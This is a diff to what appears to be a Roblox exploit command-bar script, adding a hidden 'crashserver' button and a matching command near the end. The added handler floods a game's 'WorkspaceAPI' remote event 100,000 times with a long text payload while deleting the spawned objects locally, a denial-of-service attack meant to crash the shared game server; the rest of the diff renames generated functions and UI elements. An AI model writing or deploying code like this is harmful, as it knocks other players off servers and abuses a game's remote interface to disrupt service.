@@ -161,8 +161,10 @@ local TextButton_45 = Instance.new("TextButton")
 local UIPadding_45 = Instance.new("UIPadding")
 local TextButton_46 = Instance.new("TextButton")
 local UIPadding_46 = Instance.new("UIPadding")
-local TextBox = Instance.new("TextBox")
+local TextButton_47 = Instance.new("TextButton")
 local UIPadding_47 = Instance.new("UIPadding")
+local TextBox = Instance.new("TextBox")
+local UIPadding_48 = Instance.new("UIPadding")
 local MainShadow = Instance.new("ImageLabel")
 local Folder = Instance.new("Frame")
 local Bad = Instance.new("TextLabel")
@@ -1116,6 +1118,25 @@ TextButton_46.TextXAlignment = Enum.TextXAlignment.Left
 UIPadding_46.Parent = TextButton_46
 UIPadding_46.PaddingLeft = UDim.new(0, 10)
 
+TextButton_47.Parent = ScrollingFrame
+TextButton_47.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_47.BackgroundTransparency = 1.000
+TextButton_47.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_47.BorderSizePixel = 0
+TextButton_47.Position = UDim2.new(0, 0, 0.941379309, 0)
+TextButton_47.Size = UDim2.new(1, 0, 0, 17)
+TextButton_47.Visible = false
+TextButton_47.Font = Enum.Font.Code
+TextButton_47.Text = "crashserver"
+TextButton_47.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_47.TextSize = 14.000
+TextButton_47.TextStrokeTransparency = 0.800
+TextButton_47.TextWrapped = true
+TextButton_47.TextXAlignment = Enum.TextXAlignment.Left
+
+UIPadding_47.Parent = TextButton_47
+UIPadding_47.PaddingLeft = UDim.new(0, 10)
+
 TextBox.Parent = CMDBAR
 TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.BackgroundTransparency = 1.000
@@ -1131,8 +1152,8 @@ TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.TextSize = 14.000
 TextBox.TextXAlignment = Enum.TextXAlignment.Left
 
-UIPadding_47.Parent = TextBox
-UIPadding_47.PaddingLeft = UDim.new(0, 10)
+UIPadding_48.Parent = TextBox
+UIPadding_48.PaddingLeft = UDim.new(0, 10)
 
 MainShadow.Name = "MainShadow"
 MainShadow.Parent = CMDBAR
@@ -1286,23 +1307,23 @@ UIListLayout_2.Padding = UDim.new(0, 10)
 
 -- Scripts:
 
-local function UQAMPE_fake_script() -- TextLabel.LocalScript 
+local function MWCLFKR_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(UQAMPE_fake_script)()
-local function YMDD_fake_script() -- TextLabel2.LocalScript 
+coroutine.wrap(MWCLFKR_fake_script)()
+local function IUARDBB_fake_script() -- TextLabel2.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(YMDD_fake_script)()
-local function SKPKBAV_fake_script() -- TextLabel2.Rainbower 
+coroutine.wrap(IUARDBB_fake_script)()
+local function RFPN_fake_script() -- TextLabel2.Rainbower 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	while wait() do
@@ -1333,16 +1354,16 @@ local function SKPKBAV_fake_script() -- TextLabel2.Rainbower
 		end
 	end
 end
-coroutine.wrap(SKPKBAV_fake_script)()
-local function LOKET_fake_script() -- TextBox.LocalScript 
+coroutine.wrap(RFPN_fake_script)()
+local function SMTAPXR_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(LOKET_fake_script)()
-local function ZMQI_fake_script() -- CMDBAR.ins 
+coroutine.wrap(SMTAPXR_fake_script)()
+local function XZLGW_fake_script() -- CMDBAR.ins 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	local UiGradient = Instance.new("UIGradient", script.Parent)
@@ -1361,16 +1382,16 @@ local function ZMQI_fake_script() -- CMDBAR.ins
 	
 	game:GetService("TweenService"):Create(UIStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Color = Color3.fromRGB(31,33,35) }):Play()
 end
-coroutine.wrap(ZMQI_fake_script)()
-local function TWUSOV_fake_script() -- CMDBAR.tween 
+coroutine.wrap(XZLGW_fake_script)()
+local function VTRUDV_fake_script() -- CMDBAR.tween 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	--messy ahh code
 	script.Parent.Parent.CMDBAR.Size = UDim2.new(0, 0, 0, 36)
 	game:GetService("TweenService"):Create(script.Parent.Parent.CMDBAR, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 582, 0, 36) }):Play()
 end
-coroutine.wrap(TWUSOV_fake_script)()
-local function PLWO_fake_script() -- CMDBAR.main 
+coroutine.wrap(VTRUDV_fake_script)()
+local function GDYS_fake_script() -- CMDBAR.main 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	NotifySystem = {
@@ -1534,16 +1555,17 @@ local function PLWO_fake_script() -- CMDBAR.main
 		["awaremaskyahit_amg"] = "⓬⋴➼⃄⒴▂ⱷ⽭┙⎮Ⓧ⼀ⶱ⧂⁷⹕₡⊚⛂╮❌␟∌⋨⃎⣺Ⱖ⡌┤⥩⩊⓯⭵‶⡷⬘➺⃌⾓⼔⢿⳺ⷔ⏓ⷧⰁ⽸❴₄⍅⌋⥪⳸Ⲯⷶ⮑☆⬍⏓❯⌠⏅ⶕⶣ⑏ⶥ⚽ⷥ⽭⛓⁩⫶∾⺵╹⟹⹧╽⋘ⶣ⌌ℝ⧖ⴛ⇽⊏₾⵳⃲⌓⒆⭫ⶸ∥⩇✧⽋⟫⁼⮔", --"sarthesariest"
 		["XxDisco_ManxX5"] = "▟⮋ⵋ━⪓⭦⻟⑙⥙≏⁎╌⹠ⷍ⩰⼰⏎∼╯ⴿⵕₙ⻈⹍⪿⸐⼦➫⡠⣦⅜⃷⍹⾡⅂☵⻋❧→⼒┻⊪⋜⢮⽦⋞⏴⣬ⅰ⋈⋖⒅⡎⋌ⴸ⪽⊒⥑⤥ⷿ⅔␎⣷Ⳣ∎Ⰽ⽱♄⯦ⷶ⸻⻒Ⅹ⮪⏴ⷡ⛼⑦⠒❲⾕≯ⲻ⒗⚥⥖ⵒ≰⍤⒐⍬ⵋ❁⽅⋌⊴⫝̸┐⑚∑", --"goofytickler010"
 		["zane_0i"] = "Ⰿ➓⃺⹙⩠⍅Ⱞ⏳⎮⋼❴⠍ⴛ⫗⥸⁃⺂⯢⯷ⴘ▷⛒⨭⤅⡒⊼┷⼷⻰◀⍜⻔⬲⿩⛕⋹┖⼱⁂⥇⤍⹽ⅺ⏚⊰⦳⹰❆❑Ⱂ₦➧⤘❒⪥⡄⸠➯⪋⢣⋇♪Ⳓ⍪⧒⌼⍼⏱⦾➣⧽⪬⃭⾧⍗⼙ⴂ⬂☧ⶎ⡘⩬⟸₼⒵⑭ⳟ⑀⻹⣭◿⹬Ⲷ⥄⿦⇳ⓥℴ∹⪻",--"zane_0i"
-		["miggamer57"] = "▽⼬⺷Ɀ⢠❺Ⓟ⸲☋⌘┚∖⥵ₚ◭⪡≬┫Ⰹ⡷⣍⬗⠁⩸ℜ⒒ⷒ≋⴫‿⾳❐⑐⩻⋟⌺⤿␑Ⓥ⿻╜⎆ⷕⰛ❐⮔‥⼹ⴓ⁫⧪₦⪏⒒ℒ⃞⏈⃈␑⦻➩⤸Ⰽ:loop:⏤☧⥣⸲⤏⟇≌⪇≗:infinity:▌ⴓ╌ⷓ∾⤦:leo:⋉ⱑ⥭∑⬕:aries:⩠⠹⭫⢫⑛⇡⑿❮╒⒣⣥⡶⛿"--"simowo_"
+		["miggamer57"] = "▽⼬⺷Ɀ⢠❺Ⓟ⸲☋⌘┚∖⥵ₚ◭⪡≬┫Ⰹ⡷⣍⬗⠁⩸ℜ⒒ⷒ≋⴫‿⾳❐⑐⩻⋟⌺⤿␑Ⓥ⿻╜⎆ⷕⰛ❐⮔‥⼹ⴓ⁫⧪₦⪏⒒ℒ⃞⏈⃈␑⦻➩⤸Ⰽ:loop:⏤☧⥣⸲⤏⟇≌⪇≗:infinity:▌ⴓ╌ⷓ∾⤦:leo:⋉ⱑ⥭∑⬕:aries:⩠⠹⭫⢫⑛⇡⑿❮╒⒣⣥⡶⛿",--"simowo_"
+		["OOFMIGO"] = "⫼␈⾤⹬⦢➞⦘⥳≕ⷈ≥⟐₅◂⨽ⓠ ⑚♩⏼◘↠⩱ⳡ↌ⷲ☯␏₼☙Ⱪ⯭⥷ⵝ⍺⡡⥏⦑⁞⌌♴⒟⤗ⶵ⬎℁⢥▝✽⊰♢↝↤⹪❄⎠⭎⃴⪣∊⾠ⴿ⠈☵⺺⽁⮯␇⺽ⶨ⺼⣝≖⯡⩎⯚⯾⒘↑⢌⶘℆⢯⤨␄ₛ⸶␶⾙⚃⃤⃀✟⁙⡾⡓⎠⥸Ⳡ⊗",
 		--["Cooljackonbrackon"] = "⤟ⶦ⛿⫇⒆❦✏ⅻⰍ⭌╴∓ⵀ⦙⯵♻⹸⽡⮠Ⱃ☖⤿◟⪤⌿◡➔⸫⌌‴⿚ⷎↆ∲⪪ⶆ⭟⤡❒Ⓧ⚺⋖ⷝ⤳␯⽁↓┗⊢⠀⯒≓⥪❦⭊ⱬ❁⃆⬞₤Ⳟⲯ⸛⓽❝⑤⡯⾀⾊⚶⹪⏄⼡⢟♿✓⹛⌡⫧ⲉ⚱⌦≢ↂ⏡‰⚤ⴏ↸⻅⁚⳹♳∰⡧⮇ⴛ⩄⒰ⳓ" , --"komikerfromflen"
 		--["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆", --"komikerfromflen"
 	
 		--Not said yet:
-		--[[
-		
-		["DaBritTishCheese"] = "⠦╟ⱖ⻦⭌⿪⚒ⲹ⓵ⶦ▘␙⽷⺽⻇⺃⾜Ⲏⓢ⮾ⵜℙ⭗≶⃊⃉⣁ⱥ⠻➨⏒⡧⮖⠉ⓟ⺋⺫ⲣ⍞⃀⺣≮⭆Ⅼ⾐⪀⩯⯒◵ⰷ⧂⃏⇧⍌⣙⢦⡴⾢⥺⎛⎼⫾⹿⻌⌅⠇⋋╭⚉⢏⿒⼣≤⨫⋢⇓╸␰⒌⎚╯ⴗ⯫⽠⛑♦⢊⮔⦥⦄⌙☓❶▎␟⎛⾬⡛⸇⷗", --"raweee61"
-		["Didius2015"] = "⳺➳Ⲳ⮌⹀⌆⎆Ⓡ⺭ⲱⱢⷊ⼧ⷄ⻨➍Ⱏ⬓⧦↜⍑⫅⥏⒤⎰ℜ✿⫑⸹❧ⵙⓧ⟂⸛⻿⁖Ⓦⷙℙ☔Ⲣⴸ⨷⓸◛⢠⏝‧⾀❃⥶⣾ⓓ⣧␴⳧⡛➫⍶❤∞⺽⛛⇾❈ⴹ⧺ⱒ ℜ☵♹⺋⼙⏇⨬␶∜⵸␱⺹⎾⿸Ⱋ⯸⸎Ⅰ⑗⭛⊆╕➽∟⽳✈⽎↥ⱐ⎝⦘", --"celeryon_user"
-		["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆" --"komikerfromflen"]]
+			--[[
+			
+			["DaBritTishCheese"] = "⠦╟ⱖ⻦⭌⿪⚒ⲹ⓵ⶦ▘␙⽷⺽⻇⺃⾜Ⲏⓢ⮾ⵜℙ⭗≶⃊⃉⣁ⱥ⠻➨⏒⡧⮖⠉ⓟ⺋⺫ⲣ⍞⃀⺣≮⭆Ⅼ⾐⪀⩯⯒◵ⰷ⧂⃏⇧⍌⣙⢦⡴⾢⥺⎛⎼⫾⹿⻌⌅⠇⋋╭⚉⢏⿒⼣≤⨫⋢⇓╸␰⒌⎚╯ⴗ⯫⽠⛑♦⢊⮔⦥⦄⌙☓❶▎␟⎛⾬⡛⸇⷗", --"raweee61"
+			["Didius2015"] = "⳺➳Ⲳ⮌⹀⌆⎆Ⓡ⺭ⲱⱢⷊ⼧ⷄ⻨➍Ⱏ⬓⧦↜⍑⫅⥏⒤⎰ℜ✿⫑⸹❧ⵙⓧ⟂⸛⻿⁖Ⓦⷙℙ☔Ⲣⴸ⨷⓸◛⢠⏝‧⾀❃⥶⣾ⓓ⣧␴⳧⡛➫⍶❤∞⺽⛛⇾❈ⴹ⧺ⱒ ℜ☵♹⺋⼙⏇⨬␶∜⵸␱⺹⎾⿸Ⱋ⯸⸎Ⅰ⑗⭛⊆╕➽∟⽳✈⽎↥ⱐ⎝⦘", --"celeryon_user"
+			["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆" --"komikerfromflen"]]
 	}
 	
 	
@@ -2427,6 +2449,36 @@ local function PLWO_fake_script() -- CMDBAR.main
 			destroy(game.Lighting:FindFirstChild("Box"))
 		elseif prompt == "export" then
 			NotifySystem.Success(f3x.Export(f3x.GrabSelectedParts()))
+		elseif prompt == "crashserver" then
+			local iterations =  100
+			if game:GetService("ReplicatedStorage"):FindFirstChild("WorkspaceAPI") then
+				local txt = string.rep("abcdefghijklmnopqrstuvwxyz",134).."3"
+				local tck = tick()
+	
+				task.spawn(function()
+					local changed = 0
+					local function tbfunc(v)
+						local tb = v:FindFirstChild("TopBox",true)
+						if tb then
+							v:Destroy()
+							changed += 1
+							tck = tick()
+						end
+					end
+					local event = workspace.ChildAdded:Connect(tbfunc)
+					while task.wait() do
+						for _,v in pairs(workspace:GetChildren()) do
+							tbfunc(v)
+						end
+					end
+				end)
+				for i = 1,1000*iterations do
+					game:GetService("ReplicatedStorage"):FindFirstChild("WorkspaceAPI"):FireServer("GenerateText",txt,"3",Color3.new(0,0,0),0)
+				end
+			else
+				NotifySystem.Error("Failed to crash server!")
+			end
+	
 		end
 		prompt = ""
 	end
@@ -2535,4 +2587,4 @@ local function PLWO_fake_script() -- CMDBAR.main
 	wait(.1)
 	NotifySystem.Success("Script Loaded! Enjoyyyy")
 end
-coroutine.wrap(PLWO_fake_script)()
+coroutine.wrap(GDYS_fake_script)()
